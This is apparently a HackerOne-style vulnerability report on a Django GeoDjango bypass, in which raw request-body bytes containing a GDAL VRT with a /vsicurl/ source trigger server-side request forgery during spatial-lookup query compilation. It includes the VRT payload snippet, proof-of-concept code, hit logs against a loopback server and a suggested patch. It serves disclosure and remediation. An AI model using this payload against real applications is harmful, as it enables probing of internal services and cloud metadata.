# CVE-2026-15307 bypass: VRT bytes accepted in GeoDjango spatial lookups can trigger SSRF via /vsicurl/

## Summary

Django's mitigation for CVE-2026-15307 blocks raw `str`, `pathlib.Path`, and `dict` raster lookup values because they may cause GDAL to write files or fetch remote resources.

However, raw `bytes` are deliberately still accepted. Django's security documentation explains that bytes are allowed because they are opened through GDAL's memory-based `/vsimem/` virtual filesystem.

That assumption is incomplete.

A byte buffer can itself contain a GDAL VRT dataset. Although Django stores the VRT document in `/vsimem/`, the VRT may contain a `SourceFilename` using another GDAL virtual filesystem such as `/vsicurl/`. When Django serializes the raster for a PostGIS spatial lookup, GDAL reads the VRT band and dereferences that external source.

As a result, attacker-controlled raw HTTP request bytes can pass the CVE-2026-15307 lookup guard and cause outbound HTTP requests from the Django process.

I also confirmed a blind SSRF case: the target does not need to return a valid raster. GDAL sends HEAD/GET requests before ultimately rejecting the response.

## Affected versions

Confirmed vulnerable on current supported branches:

- stable/5.2.x — tested as Django 5.2.18 alpha
- stable/6.0.x — tested as Django 6.0.9 alpha
- stable/6.1.x — tested as Django 6.1.2 alpha

The same behavior was also confirmed on the first security-fixed releases:

- Django 5.2.17
- Django 6.0.8
- Django 6.1.1

## Root cause

The CVE-2026-15307 mitigation is implemented in:

`django/contrib/gis/gdal/raster/source.py`

```python
@classmethod
def check_raster_lookup_value(cls, ds_input):
    normalized = cls._preprocess_input(ds_input)
    if isinstance(normalized, (dict, str)):
        raise DisallowedRasterLookup(...)
```

Bytes are intentionally not rejected.

`RasterField.get_prep_value()` considers bytes a raster/geometry candidate:

```python
is_candidate = isinstance(obj, (bytes, str)) or hasattr(
    obj, "__geo_interface__"
)
```

The bytes are then passed to `GDALRaster(value)`.

For byte input, `GDALRaster` writes the buffer to a random `/vsimem/` path and opens it with GDAL:

```python
elif isinstance(ds_input, bytes):
    self._write = 1
    ...
    vsi_path = os.path.join(VSI_MEM_FILESYSTEM_BASE_PATH, str(uuid.uuid4()))
    capi.create_vsi_file_from_mem_buffer(...)
    self._ptr = capi.open_ds(force_bytes(vsi_path), self._write)
```

The security assumption is that this confines the input to memory.

But VRT is a metadata format. A VRT stored in `/vsimem/` can reference a separate source such as:

```xml
<SourceFilename relativeToVRT="0">
  /vsicurl/http://127.0.0.1:18765/source.tif
</SourceFilename>
```

During PostGIS adaptation, Django calls `to_pgraster()`, which reads each band:

```python
result += bandheader + band.data(as_memoryview=True)
```

Reading the VRT band makes GDAL dereference the `SourceFilename`, causing the outbound network request.

## Request-facing reachability

Django documents `HttpRequest.body` as the raw HTTP request body as a bytestring.

Therefore an application can naturally pass attacker-controlled bytes into a spatial lookup without any custom decoding step.

The PoC uses:

```python
request = RequestFactory().post(
    "/lookup",
    data=vrt,
    content_type="application/octet-stream",
)

attacker_bytes = request.body
```

and confirms:

```
REQUEST_BODY_TYPE= bytes
CHECK_RASTER_LOOKUP_VALUE=ALLOWED_REQUEST_BODY_BYTES
PREPARED_DRIVER= VRT
```

## Proof of concept

Repository:

`https://github.com/NightVibes33/Test/tree/h1-django-gdal-vrt-bytes-ssrf`

Primary workflow:

`.github/workflows/django-gdal-vrt-bytes-ssrf.yml`

Workflow run with blind-SSRF proof:

`36353403093`

The PoC uses only a loopback HTTP server under my control.

### Successful raster target

A VRT supplied as raw request-body bytes references:

```
/vsicurl/http://127.0.0.1:18765/source.tif
```

Django accepts the bytes through the CVE-2026-15307 guard.

Normal PostGIS raster serialization then produces outbound requests such as:

```
HTTP_HITS= [
  ('HEAD', '/source.tif'),
  ('GET', '/source.tif'),
  ...
]
SUCCESSFUL_TARGET_SSRF=CONFIRMED
```

### Blind SSRF target

The PoC then references a target returning plain text rather than raster data:

```
/vsicurl/http://127.0.0.1:18765/not-a-raster
```

GDAL eventually raises an error because the response is not a raster, but the outbound requests have already occurred:

```
BLIND_TARGET_SERIALIZATION_ERROR= GDALException
BLIND_TARGET_HTTP_HITS= [
  ('HEAD', '/not-a-raster'),
  ('GET', '/not-a-raster'),
  ('HEAD', '/not-a-raster.aux'),
  ('GET', '/not-a-raster.aux'),
  ('HEAD', '/not-a-raster.hdr'),
  ('GET', '/not-a-raster.hdr'),
  ('HEAD', '/not-a-raster.xml'),
  ('GET', '/not-a-raster.xml')
]
BLIND_SSRF=CONFIRMED
POC_RESULT=REQUEST_BODY_BYTES_SSRF_CONFIRMED
```

This demonstrates that the destination does not need to cooperate or return a valid raster for an outbound request to occur.

## Public ORM reproduction

A second workflow validates the same behavior through the public QuerySet API rather than manually instantiating `PostGISAdapter`:

`.github/workflows/django-gdal-vrt-bytes-queryset-ssrf.yml`

Workflow run:

`36353589548`

The reproduction uses an unmanaged model with a `RasterField` and:

```python
queryset = RasterModel.objects.filter(rast__contains=request.body)
sql, params = queryset.query.sql_with_params()
```

On stable/5.2.x, stable/6.0.x, and stable/6.1.x, query construction causes no request, but ordinary SQL compilation triggers the outbound fetch through Django's normal GIS adapter path:

```
HITS_AFTER_FILTER_CONSTRUCTION= []
SQL_PREFIX= SELECT "poc_raster"."id", "poc_raster"."rast" FROM "poc_raster"
            WHERE ST_Contains("poc_raster"."rast", %s)
HTTP_HITS_AFTER_SQL_COMPILE= [
  ('HEAD', '/source.tif'),
  ('GET', '/source.tif'),
  ...
]
POC_RESULT=QUERYSET_REQUEST_BODY_SSRF_CONFIRMED
```

This does not require a live PostGIS server; the SSRF occurs while Django prepares the query parameter.

## Security impact

Applications that accept raster-like binary request bodies and use those bytes in GeoDjango spatial lookups can be induced to make attacker-controlled outbound requests from the Django process.

Potential impact includes:

- blind SSRF to internal HTTP services;
- access to network locations that are reachable from the application server but not from the attacker;
- interaction with cloud/internal metadata or control-plane endpoints where network-level trust is relied upon;
- network probing through observable request timing or side effects.

The target does not need to return a valid raster for the outbound request to occur.

This is a bypass of the core security assumption introduced for CVE-2026-15307: placing attacker-controlled bytes into `/vsimem/` does not guarantee that GDAL will remain memory-only, because formats such as VRT can reference other virtual filesystems.

## Suggested fix

Do not implicitly treat raw bytes as trusted raster input in spatial lookups.

One approach is to make `check_raster_lookup_value()` reject bytes in addition to dict/string/Path input, while preserving valid WKB geometry bytes by allowing them to fall through to `GEOSGeometry`.

Conceptually:

```diff
- if isinstance(normalized, (dict, str)):
+ if isinstance(normalized, (bytes, dict, str)):
      raise DisallowedRasterLookup(...)
```

Then, in `BaseSpatialField.get_prep_value()`, preserve the current geometry fallback so valid binary WKB continues to work. If GEOS parsing fails and the original input was blocked raw bytes, raise `DisallowedRasterLookup`.

Raster bytes would then require an explicit `GDALRaster(...)` wrapper, matching the trust opt-in already required for raw string/dict raster inputs.

Regression tests should cover:

1. raw VRT bytes containing a `/vsicurl/` source are rejected in spatial lookups;
2. valid WKB geometry bytes remain accepted;
3. explicitly wrapped `GDALRaster(vrt_bytes)` remains available as the opt-in trusted path.

## Weakness

CWE-918 — Server-Side Request Forgery (SSRF)

HackerOne weakness ID: 68
